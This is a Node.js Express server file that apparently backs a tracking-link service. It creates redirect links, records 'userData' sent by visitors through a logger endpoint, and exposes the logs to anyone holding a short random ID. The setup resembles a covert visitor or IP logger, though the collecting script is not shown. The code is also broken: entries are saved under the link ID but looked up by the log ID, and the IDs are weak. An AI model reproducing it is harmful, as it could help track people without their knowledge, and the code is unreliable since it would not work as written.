const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const phpExpress = require('php-express')();

const app = express();
const port = process.env.PORT || 3000;

app.use(bodyParser.json());
app.use(express.static('public'));

// Set up PHP engine
app.engine('php', phpExpress.engine);
app.set('views', path.join(__dirname, 'public'));
app.set('view engine', 'php');

// Store redirect link and generate LinkID and LogID
app.post('/server.js', (req, res) => {
    const linkID = generateID();
    const logID = generateID();
    const redirectLink = req.body.redirectLink;

    const logDataPath = path.join(__dirname, 'log.json');

    let logData = {};
    if (fs.existsSync(logDataPath)) {
        const logDataContent = fs.readFileSync(logDataPath, 'utf8');
        if (logDataContent.trim() !== '') {
            logData = JSON.parse(logDataContent);
        }
    }

    logData[linkID] = {
        logID,
        redirectLink,
        logs: []
    };

    fs.writeFileSync(logDataPath, JSON.stringify(logData, null, 2));

    res.json({
        loggerID: logID,
        linkID: linkID
    });
});

// Receive logger data and log it
app.get('/server.js/logger.php', (req, res) => {
    const loggerID = req.query.loggerID;
    const logID = req.query.logID;

    // Use req.query.userData to get user data from log.js

    const logDataPath = path.join(__dirname, 'log.json');
    let logData = {};
    if (fs.existsSync(logDataPath)) {
        const logDataContent = fs.readFileSync(logDataPath, 'utf8');
        if (logDataContent.trim() !== '') {
            logData = JSON.parse(logDataContent);
        }
    }

    const logs = logData[logID].logs || [];

    logs.push({
        loggerID,
        userData: req.query.userData
    });

    fs.writeFileSync(logDataPath, JSON.stringify(logData, null, 2));

    // Retrieve redirect link from log.json and send it back
    res.json({
        redirectLink: logData[logID].redirectLink
    });
});

// Get log data based on LogID
app.get('/server.js/log.html', (req, res) => {
    const logID = req.query.logID;

    const logDataPath = path.join(__dirname, 'log.json');
    let logData = {};
    if (fs.existsSync(logDataPath)) {
        const logDataContent = fs.readFileSync(logDataPath, 'utf8');
        if (logDataContent.trim() !== '') {
            logData = JSON.parse(logDataContent);
        }
    }

    const logs = logData[logID].logs || [];

    res.json(logs);
});

// Helper function to generate random ID
function generateID() {
    return 'ID' + Math.random().toString(36).substr(2, 5).toUpperCase();
}

app.listen(port, () => console.log(`Server running at http://localhost:${port}`));
